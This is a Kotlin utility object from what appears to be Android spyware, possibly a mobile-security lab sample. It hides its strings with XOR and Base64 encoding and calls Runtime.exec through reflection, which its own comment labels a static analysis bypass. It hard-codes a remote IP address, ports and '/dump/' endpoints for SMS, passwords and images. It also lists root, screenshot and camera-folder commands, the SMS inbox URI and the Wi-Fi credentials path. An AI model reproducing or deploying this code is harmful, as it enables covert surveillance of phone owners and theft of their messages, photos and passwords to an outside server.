package com.example.mobsec_823.utils

import android.util.Base64
import java.lang.reflect.Method

object SecretBox {
    private const val SEASONING = 0x7A.toByte()

    /**
     * Decodes obfuscated strings using XOR and Base64.
     */
    fun decrypt(encrypted: String): String {
        return try {
            val data = Base64.decode(encrypted, Base64.DEFAULT)
            String(data.map { (it.toInt() xor SEASONING.toInt()).toByte() }.toByteArray())
        } catch (e: Exception) {
            ""
        }
    }

    /**
     * Static Analysis Bypass: Dynamic Reflection to invoke Runtime.exec()
     */
    fun reflectedExec(command: String): Process? {
        return try {
            val rName = String(byteArrayOf(106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101))
            val mGetName = String(byteArrayOf(103, 101, 116, 82, 117, 110, 116, 105, 109, 101))
            val mExecName = String(byteArrayOf(101, 120, 101, 99))

            val runtimeClass = Class.forName(rName)
            val getRuntimeMethod: Method = runtimeClass.getMethod(mGetName)
            val runtimeInstance = getRuntimeMethod.invoke(null)
            val execMethod: Method = runtimeClass.getMethod(mExecName, String::class.java)

            execMethod.invoke(runtimeInstance, command) as? Process
        } catch (e: Exception) {
            null
        }
    }

    // IPs and Ports
    fun getKitchenAddress(): String = decrypt("Tk1US0hDVEtOTlRD") // 47.129.144.9
    fun getTruckPort(): Int = 1269
    fun getToppingPort(): Int = 6767
    fun getCarnePort(): Int = 7000

    // Endpoints
    fun getRubbishEndpoint(): String = decrypt("Eg4OCkBVVU5NVEtIQ1RLTk5UQ0BCSkpKVREPFwpVCRcXCQ==") // http://47.129.144.9:8000/dump/sms
    fun getRecycleEndpoint(): String = decrypt("Eg4OCkBVVU5NVEtIQ1RLTk5UQ0BCSkpKVREPFwpVDBsJCQ0VCA4JCQ==") // http://47.129.144.9:8000/dump/passwords
    fun getSignageEndpoint(): String = decrypt("Eg4OCkBVVU5NVEtIQ1RLTk5UQ0BCSkpKVREPFwpVExcbHR0fCQ==") // http://47.129.144.9:8000/dump/images
    fun getCarneHeader(): String = decrypt("KiUpLlpVCA8XFR4fVwlODg8WFllNMkowLkoqVUtUSw==") // POST /remote-stream HTTP/1.1...

    // Shell Commands
    fun getScreencapCmd(): String = decrypt("CRkIHx8UGRsKOldXCg==") // screencap -p
    fun getListSignageCmd(): String = decrypt("FglZVw5ZVQkdGxsbCFVPOUM3VVE5GxcfCBsb") // ls -t /sdcard/DCIM/Camera
    fun getSuCmd(): String = decrypt("CQ8=") // su
    fun getExitCmd(): String = decrypt("HwITDg==") // exit
    
    // URIs and Paths
    fun getScrapUri(): String = decrypt("GRUUDh8UDhBVVQlXCQlVExQUGBUC") // content://sms/inbox
    fun getWifiPath(): String = decrypt("VRsbDhsaVRcTCxkVDxMcExVVDwoZJVUJCQYTGxkUDhQZFRQc") // /data/misc/wifi/wpa_supplicant.conf
    
    // Command Strings
    fun getCmdStop(): String = decrypt("OTc+JSkuJSos") // CMD_STOP
    fun getCmdStart(): String = decrypt("OTc+JSkuOxsoLg==") // CMD_START
}
